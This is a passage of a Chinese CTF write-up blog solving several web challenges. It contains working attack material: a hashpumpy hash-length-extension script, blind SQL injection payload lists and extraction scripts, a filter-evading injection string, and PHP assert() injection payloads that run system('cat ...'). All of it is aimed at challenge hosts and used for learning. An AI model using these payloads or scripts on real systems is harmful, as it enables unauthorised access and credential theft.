<p>因为MD5，url解码，一开始以为是php语言漏洞，诸多尝试无果。<br>仔细收集已有信息，分析问题如下<br>有 <strong>未知15位secret+’admin’+’admin’</strong> 的hash<br>求 <strong>未知15位secret+’admin’+password</strong> 的hash<br>查阅资料，新的知识盲区，密码学知识： <a href="//www.freebuf.com/articles/web/31756.html">hash长度扩展攻击</a><br>之后的题解就参考别人的吧：</p>
<ul>
<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">c语言MD5的题解</a>:最后一步计算MD5前512位随便是因为在C代码中ABCD改的不是初始值，而是512为整数的分组执行完毕之后的ABCD。</li>
<li><a href="http://blog.csdn.net/u010726042/article/details/70738279" target="_blank" rel="external">python的题解hashpumpy和hashpump</a></li>
</ul>
<p>然后是给自己以后看,方便回忆的粗糙原理手绘图QAQ<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrf3ssur3j31hc0u0n6d.jpg" alt="hash长度攻击,png"></p>
<ul>
<li>512位的分组后面第一位写1,再补零，后64位写原来的长度，使之生成的MD5与secretadminadmin的完全一致</li>
<li>本地生成MD5时，512位的分组随便填写，最后一次变换的ABCD值用secretadminadmin的MD5值转变来（高地位互换），之所以要512位的分组是让最后填充的长度数值相同</li>
</ul>
<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">戳这里=w=</a><br>此题前提：[9.18]有点意思吧</p>
<h3 id="涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><a href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本" class="headerlink" title="涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本"></a>涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</h3><div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm8frpyfj30no03xq2q.jpg" alt="1"><br></div>

<p>web日常1：先看源码，没啥东西。<br>web日常2：跑目录——用字典替换url后缀，访问，查看是否成功。可用burpsuite+字典 或 <a href="https://github.com/Err0rzz/SourceLeakHacker" target="_blank" rel="external">工具</a></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm8ujz3kj30m108iwj3.jpg" alt="2"><br></div>

<p>(多线程 HTTPConnectionPool问题 暂未解决)<br>看到<strong>index.php~</strong>,访问，下载过来一个文件<br>文件日常：拉到kali下用file，binwalk 判断文件类型和有没有隐藏 （后缀是~,和开头是 . 的文件在桌面不直接显示，需要<strong>ls</strong>查看）</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjsm91ak2kj30fs06jgnq.jpg" alt="3"><br></div>

<p><strong>vim的swp格式</strong>：vim编写的文件可能会有错误遗留文件：data.php –&gt; .data.php.swp (若修改文件再次错误 后缀变为.swo .swn 尾字母向前推移)</p>
<p>index.php~加上.swp后缀。用<strong>vim -r index.php~.swp</strong> 恢复读写模式可以打开，得到页面源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</div><div class="line">        body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;</div><div class="line">        &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">        &lt;?php</div><div class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                <span class="variable">$role</span> = <span class="string">"guest"</span>;</div><div class="line">                <span class="variable">$salt</span> =</div><div class="line">                <span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</div><div class="line">                        <span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</div><div class="line">                        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</div><div class="line">                        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">true</span>;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                        &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</div><div class="line">                        setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</div><div class="line">                        <span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</div><div class="line">                        setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</div><div class="line">                        <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is“</span></div><div class="line"><span class="string">                &#125; else &#123;</span></div><div class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">        ?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div></pre></td></tr></table></figure></p>
<p><a href="https://phperzh.com/articles/1814" target="_blank" rel="external">serialize与unserialize函数</a>      <a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="external">strrev函数</a><br>结合抓包，分析源码：</p>
<ul>
<li>要求 role不为空 ，此处必然满足，不考虑</li>
<li>要求 role反序列化后 === ‘admin’</li>
<li>要求 MD5（salt.role的反转字符串） === hsh</li>
<li>已知 MD5($salt.”<strong>;”tseug”:5:s</strong>“) = 3a4727d57463f122833d9e732f94e4e0<br>解决第一个反序列化后相等，利用<a href="https://phperzh.com/articles/1814" target="_blank" rel="external">php在线</a>测试序列化与反序列化的特性及漏洞：</li>
</ul>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm98tiabj30ug072q30.jpg" alt="4"><br></div>

<p><strong>序列化</strong>：根据数据结构变成特定的字符串，s为str，i为int，{ }为数组等等。<br><strong>反序列化</strong>：根据开头判断数据结构类型，只会读取该结构内的字符，后面的字符不做处理。</p>
<p>根据以上特性，使role开头 = <strong>s:5”admin”;</strong> 就可满足条件。</p>
<hr>
<p>解决第二个HASH相等，根据hash长度攻击的要求：</p>
<ul>
<li>因为反转，role的末尾需要 = <strong>s:5”guest”;</strong></li>
<li>salt的长度未知，考虑利用python脚本暴力破解</li>
</ul>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding=utf8</span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s ") = 3a4727d57463f122833d9e732f94e4e0 </span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s xxxxx ;"nimda":5:s ") = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashpumpy</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">hexdigest = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span>;</div><div class="line">original_data = <span class="string">";\"tseug\":5:s"</span>;</div><div class="line">data_to_add = <span class="string">";\"nimda\":5:s"</span>;</div><div class="line">url=<span class="string">"http://web.jarvisoj.com:32778"</span>;</div><div class="line"></div><div class="line"><span class="comment">#设置key_length的范围</span></div><div class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">	result = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length);</div><div class="line"></div><div class="line">	role_re = result[<span class="number">1</span>][::<span class="number">-1</span>];  	 <span class="comment">#16进制\x80 代表一个字符 可以直接对换</span></div><div class="line">	role = urllib.quote(role_re); 	 <span class="comment">#16进制直接url编码得到 %xx</span></div><div class="line">	hsh = result[<span class="number">0</span>];</div><div class="line">	cookies = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;;</div><div class="line">	</div><div class="line">	response = requests.get(url,cookies=cookies);</div><div class="line">	<span class="keyword">if</span> response.headers[<span class="string">'Content-Length'</span>] != <span class="string">'210'</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div><div class="line">		<span class="keyword">print</span> response.text</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm9frsbqj30lx0e977w.jpg" alt="5"><br></div>


<h2 id="9-1-看起来有点难啊"><a href="#9-1-看起来有点难啊" class="headerlink" title="[9.1]看起来有点难啊"></a>[9.1]看起来有点难啊</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：sql盲注"><a href="#涉及范围：sql盲注" class="headerlink" title="涉及范围：sql盲注"></a>涉及范围：sql盲注</h3><p>哎，做完之后感想，还是才学疏浅没有脑洞的J，第一步就卡死了。<br>进行以下sql注入尝试，尝试得到两种返回状况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin= 1’ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= 1’ or <span class="string">'1'</span>=<span class="string">'1'</span> --+  <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin‘ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin<span class="string">' and '</span>1<span class="string">'='</span>2<span class="string">' --+ pwd=1</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">admin= admin’</span></div></pre></td></tr></table></figure></p>
<p>总结出题目的三种返回状态：</p>
<ul>
<li><strong>数据库链接失败！</strong>：从数据库返回0行</li>
<li><strong>登录失败，错误的用户名和密码</strong>：从数据库有返回</li>
<li><strong>空白</strong>: sql语句错误</li>
</ul>
<p>有小朋友可能要提出，为啥要试admin呀，我一开始就是没有想到试admin，也没有用 or 找到三种返回的规律，两脸蒙蔽。<br>但是只要想到 <code>1’ or ‘1’=’1‘ and 巴拉巴拉 --+</code> 一样可以得到两种返回状态，只不过再需要盲注一下username得出admin<br>于是就是<strong>布尔型盲注</strong></p>
<p>然后就盲注套路走起来:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 username password</span></div><div class="line"></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and table.column is not null"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line">或</div><div class="line">sql=“admin<span class="string">' and substring(password,1,1)= '</span>i<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> ascii(substring(password,<span class="number">1</span>,<span class="number">1</span>)) = <span class="string">'123'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and password like '</span>i%<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> password = <span class="string">'flag'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and ascii(substring(password,%s,1))-10 -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> case when(substr(password,%s,<span class="number">1</span>)=<span class="string">'i'</span>) then sleep(<span class="number">10</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) -- ”</div><div class="line">sql=“admin<span class="string">' and if(substr(password,%s,1)='</span>i<span class="string">') ,sleep(10) , sleep(0) -- ”</span></div></pre></td></tr></table></figure></p>
<p>  另外在此题中不能使用select，简单尝试过滤无效，就不用类似<code>&quot;admin&#39; and (select password from table)&gt;0&quot;</code>注入。</p>
<p>  最后贴上跑username和password的代码，注意</p>
<ul>
<li>访问太频繁会被禁止访问，考虑sleep或改参数几位几位跑</li>
<li>页面编码不同无法直接显示匹配字符，右键返回页面查看源码发现是GB2312,解码匹配</li>
<li>chr() : ascii–&gt;字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'admin'</span>:sql %(i,x),<span class="string">'pass'</span>:<span class="string">'admin'</span>,<span class="string">'action'</span>:<span class="string">'login'</span>&#125;</div><div class="line">	response=requests.get(url,params=data)</div><div class="line">	<span class="comment">#print response.content.decode('GB2312')</span></div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'GB2312'</span>).find(<span class="string">'数据库'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">150</span>):</div><div class="line">		print(x),</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>脚本出username,password直接提交得到FLAG。</p>
<p>哎….常规套路的题目做了半天………QAQ</p>
<h2 id="皇家邮电平台"><a href="#皇家邮电平台" class="headerlink" title="皇家邮电平台"></a>皇家邮电平台</h2><p><a href="http://cms.nuptzj.cn/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><a href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用" class="headerlink" title="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"></a>涉及范围：源码泄露，本地文件包含，sql注入，后门利用</h3><p>这题题目步骤以及源码较多，自己写需要花大力气，查到两篇不错的writeup，互补贴用了。<br><a href="http://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/" target="_blank" rel="external">题解1</a><br><a href="http://blog.csdn.net/ni9htmar3/article/details/53791997" target="_blank" rel="external">题解2</a>（ctrl+f 皇家）<br>大致记录一下解题的点：</p>
<ul>
<li>观察各个页面的源代码，发现<code>file=sm.txt</code>,修改参数得到各个页面的源码</li>
<li>分析源码，得到更多页面，发现后台登录页面；</li>
<li>分析源码，sql只过滤一遍,过滤不严格，sql注入点在so.php</li>
<li>根据提示爆破账号密码</li>
<li>后台登录界面登录，得到回调木马</li>
<li>利用木马遍历目录，得到flag</li>
</ul>
<p>这题环环相扣，漏掉一点都无法继续，也有很多多余的杂乱信息。<br>从分析页面到getshell，可以说是比较现实的WEB渗透了。<br>对后门我也是只懂皮毛….贴上找到的知识贴——<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external">关于各种后门</a><br>放上自己的注入代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">爆破账号密码：</div><div class="line">soid=chacharr(49)/**/anandd/**/(seselectlect/**/ascii(substring(userpaspasss,1,1))/**/ffromrom/**/aadmindmin)&lt;&gt;1</div></pre></td></tr></table></figure></p>
<p><strong>Q&amp;A</strong></p>
<p>遍历后的出现目录的页面 乱码 ：下载页面，到sublime中换编译方式打开即可</p>
<hr>
<p>还有好长的路呢…..慢慢学习嗯</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="git信息泄露-hackgit-php字符串拼接注入"><a href="#git信息泄露-hackgit-php字符串拼接注入" class="headerlink" title=".git信息泄露 hackgit php字符串拼接注入"></a>.git信息泄露 hackgit php字符串拼接注入</h3><p>全程知识盲区…<br>about页面得知用到git<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="external">git</a>的配置不当有可能导致.git信息泄露,漏洞表现：</p>
<ul>
<li>可以查看  .git  .git/objects</li>
<li>可以下载  .git/index<br>利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>尝试下载源码，有一些php,找到目标<strong>flag.php</strong></li>
</ul>
<p>index.php其中关键源码：<br>‘’’php<br>&lt;?php<br>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>‘’’</p>
<p>咋一看并没有什么软用，但是</p>
<ul>
<li>可以控制$page的值</li>
<li>php神奇的特性，字符串链接命令，命令可以执行<br><a href="http://ww1.sinaimg.cn/large/006iKNp3gy1fkfmrveqtej30l002dt8j.jpg" target="_blank" rel="external">字符串链接</a></li>
<li>与sql注入原理相同的php拼接写入代码</li>
</ul>
<p>payload(为了清楚，变量不写””):<br>‘’’php<br>$page = ‘.system(“ls ./templates”).’   ;<br>$file(合并后) = templates/‘.system(“ls ./templates”).’..php   ;<br>assert(“strpos(‘templates/.’ . system(“ls ./templates”) .  ‘..php’ , ‘..’ ) === false”)<br>‘’’<br>由于assert函数，会把””中的语句当做php代码执行，所以可以在其中用<strong>//</strong>注释””后面乱七八糟的语句，自己构筑代码<br>所以给出另一个payload<br>‘’’php<br>$page = ‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //   ;<br>$file(合并后) = templates/‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //.php   ;<br>assert(  “strpos(‘templates/‘ , ‘..’) === false  and  system(‘cat ./templates/flag.php’);    //.php’, ‘..’ ) === false”  );<br>‘’’<br>两种payload都可以在<code>system(&quot; &quot;)</code>中可以执行任意linux命令<br>flag.php返回需要查看源码才能看到…….嗯..绝望卡了两年</p>
<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="external">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">        &#125;;</div></pre></td></tr></table></figure></p>
<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</div><div class="line">           <span class="keyword">this</span>.del(b);</div><div class="line">           c || (c = <span class="string">"/"</span>);</div><div class="line">           b = b + <span class="string">"="</span> + escape(d);</div><div class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</div><div class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</div><div class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</div><div class="line">           document.cookie = b</div><div class="line">       &#125;;</div></pre></td></tr></table></figure></p>
<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">这里</a><br>得到flag</p>
<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><a href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀" class="headerlink" title="后台 伪验证 sql注入 登录 模板注入攻击 菜刀"></a>后台 伪验证 sql注入 登录 模板注入攻击 菜刀</h3><p>很厉害的一个网页，随便点点没什么发现。<br>右键源码一个个看，没什么发现。<br>上工具<strong>SourceLeakHacker</strong>跑目录</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg" alt="跑目录"><br></div><br>先尝试访问<strong>200</strong>（正确返回），没有可用信息<br>再尝试访问<strong>303</strong>（跳转），找到<strong>/admin</strong>跳转至后台登录界面<strong>/admin-sign</strong><br>随意试着登录，有逐层递进四种返回状态：<br>+ <strong>参数不能为空！</strong>：判断参数是否为空<br>+ <strong>验证码不正确！</strong>：判断验证码<br>+ <strong>用户名不存在！</strong>：判断用户名是否存在<br>+ <strong>用户认证失败！</strong>：判断密码是否正确<br>先要解决验证码问题，抓包发现，发送账号密码验证码等信息后会再发一个请求包，来修改验证码图片<br><div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg" alt="验证码包"><br></div>

<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></div><div class="line"></div><div class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</div><div class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</div><div class="line">	response=requests.post(url,cookies=cookies,data=data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div 